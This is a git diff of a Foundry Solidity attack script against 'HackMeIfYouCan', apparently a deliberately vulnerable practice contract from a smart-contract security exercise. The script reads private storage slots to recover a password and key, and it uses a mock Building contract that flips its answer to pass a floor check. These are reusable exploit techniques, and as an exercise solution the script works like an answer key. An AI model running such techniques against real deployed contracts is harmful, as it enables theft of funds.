@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity 0.7.0;
 
-import {Script} from "forge-std/Script.sol";
+import {Script, console} from "forge-std/Script.sol";
 import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";
 
 interface Building {
@@ -9,102 +9,96 @@ interface Building {
 }
 
 contract BuildingMock is Building {
+    bool public lastFloorReached = false;
+
     function isLastFloor(uint256) external override returns (bool) {
-        return true;
+        console.log("BuildingMock: isLastFloor called with lastFloorReached =", lastFloorReached);
+        if (!lastFloorReached) {
+            lastFloorReached = true;
+            return false;
+        } else {
+            return true;
+        }
     }
 }
 
 contract AttackHackMeIfYouCan is Script {
-    function run() external {
-        bool isLocal = vm.envBool("IS_LOCAL");
+    HackMeIfYouCan public hackMeIfYouCan;
+    BuildingMock public buildingMock;
+
+    function run() public {
         uint256 privateKey = vm.envUint("PRIVATE_KEY");
         address payable contractAddress = payable(vm.envAddress("CONTRACT_ADDRESS"));
 
-        // Utilisez cast pour obtenir les données de stockage
+        // Load the storage data for password and key
         bytes32 password = vm.load(contractAddress, bytes32(uint256(3)));
-        bytes32 key = vm.load(contractAddress, bytes32(uint256(4 + 12)));
+        bytes32 key = vm.load(contractAddress, bytes32(uint256(16)));
 
         vm.startBroadcast(privateKey);
 
-        HackMeIfYouCan hackMe;
+        hackMeIfYouCan = HackMeIfYouCan(contractAddress);
 
-        if (isLocal) {
-            // Déployez le contrat en local
-            bytes32[15] memory data = [
-                bytes32(0), bytes32(0), bytes32(0), bytes32(0), bytes32(0),
-                bytes32(0), bytes32(0), bytes32(0), bytes32(0), bytes32(0),
-                bytes32(0), bytes32(0), bytes32(0), bytes32(0), key
-            ];
-            hackMe = new HackMeIfYouCan(password, data);
-            emit Log("Contract deployed locally");
+        // Log the start of the attack
+        console.log("Starting marks maximization...");
+
+        // Step 1: Send ethers to obtain marks via contribute and receive
+        (bool contributeSuccess,) = address(hackMeIfYouCan).call{value: 0.0001 ether}(abi.encodeWithSignature("contribute()"));
+        console.log(contributeSuccess ? "contribute: success" : "contribute: failed");
+
+        (bool receiveSuccess,) = address(hackMeIfYouCan).call{value: 0.001 ether}("");
+        console.log(receiveSuccess ? "receive: success" : "receive: failed");
+
+        // Step 2: Call addPoint function to try adding points
+        console.log("Attempting to add point...");
+        try hackMeIfYouCan.addPoint() {
+            console.log("addPoint called");
+        } catch Error(string memory reason) {
+            console.log(reason);
+        } catch {
+            console.log("addPoint failed for unknown reason");
+        }
+
+        // Step 3: Attempt to send the correct key
+        console.log("Attempting to send key...");
+        try hackMeIfYouCan.sendKey(bytes16(key)) {
+            console.log("sendKey called");
+        } catch Error(string memory reason) {
+            console.log(reason);
+        } catch {
+            console.log("sendKey failed for unknown reason");
+        }
+
+        // Step 4: Attempt to send the correct password
+        console.log("Attempting to send password...");
+        try hackMeIfYouCan.sendPassword(password) {
+            console.log("sendPassword called");
+        } catch Error(string memory reason) {
+            console.log(reason);
+        } catch {
+            console.log("sendPassword failed for unknown reason");
+        }
+
+        // Step 5: Reach the last floor using a Building mock
+        buildingMock = new BuildingMock();
+        console.log("Attempting to go to the last floor...");
+        console.log("BuildingMock address:", address(buildingMock));
+        console.log("HackMeIfYouCan address:", address(hackMeIfYouCan));
+
+        // Call the `goTo` function and capture low-level data
+        (bool success, bytes memory data) = address(hackMeIfYouCan).call(abi.encodeWithSignature("goTo(uint256)", 100));
+        if (success) {
+            console.log("goTo called");
         } else {
-            // Utilisez le contrat déployé sur Sepolia
-            hackMe = HackMeIfYouCan(contractAddress);
-            emit Log("Using deployed contract on Sepolia");
-            emit LogAddress(contractAddress);
+            console.logBytes(data);
+            console.log("goTo failed for unknown reason");
         }
 
-        // Attaque pour maximiser les marks
-        emit Log("Starting marks maximization...");
-
-        // 1. Envoyez des ethers pour obtenir des marks via contribute et receive
-        (bool contributeSuccess,) = address(hackMe).call{value: 0.0001 ether}(abi.encodeWithSignature("contribute()"));
-        emit Log(contributeSuccess ? "contribute: success" : "contribute: failed");
-
-        (bool receiveSuccess,) = address(hackMe).call{value: 0.001 ether}("");
-        emit Log(receiveSuccess ? "receive: success" : "receive: failed");
-
-        // 2. Appel à la fonction addPoint pour essayer d'ajouter des points
-        emit Log("Attempting to add point...");
-        try hackMe.addPoint() {
-            emit Log("addPoint called");
-        } catch Error(string memory reason) {
-            emit Log(reason);
-        } catch {
-            emit Log("addPoint failed for unknown reason");
-        }
-
-        // 3. Essayez d'envoyer la clé correcte
-        emit Log("Attempting to send key...");
-        try hackMe.sendKey(bytes16(key)) {
-            emit Log("sendKey called");
-        } catch Error(string memory reason) {
-            emit Log(reason);
-        } catch {
-            emit Log("sendKey failed for unknown reason");
-        }
-
-        // 4. Essayez d'envoyer le mot de passe correct
-        emit Log("Attempting to send password...");
-        try hackMe.sendPassword(password) {
-            emit Log("sendPassword called");
-        } catch Error(string memory reason) {
-            emit Log(reason);
-        } catch {
-            emit Log("sendPassword failed for unknown reason");
-        }
-
-        // 5. Atteignez le dernier étage en utilisant un mock de Building
-        emit Log("Attempting to go to the last floor...");
-        BuildingMock buildingMock = new BuildingMock();
-        try hackMe.goTo(address(buildingMock), 100) {
-            emit Log("goTo called");
-        } catch Error(string memory reason) {
-            emit Log(reason);
-        } catch {
-            emit Log("goTo failed for unknown reason");
-        }
-
-        // Récupérez les marks pour l'adresse actuelle
-        uint256 marks = hackMe.getMarks(address(this));
-        emit LogUint("Marks after actions", marks);
+        // Retrieve the marks for the current address
+        uint256 marks = hackMeIfYouCan.getMarks(address(this));
+        console.log("Marks after actions", marks);
 
         vm.stopBroadcast();
     }
-
-    event Log(string message);
-    event LogAddress(address addr);
-    event LogUint(string message, uint256 val);
 
     receive() external payable {}
 }
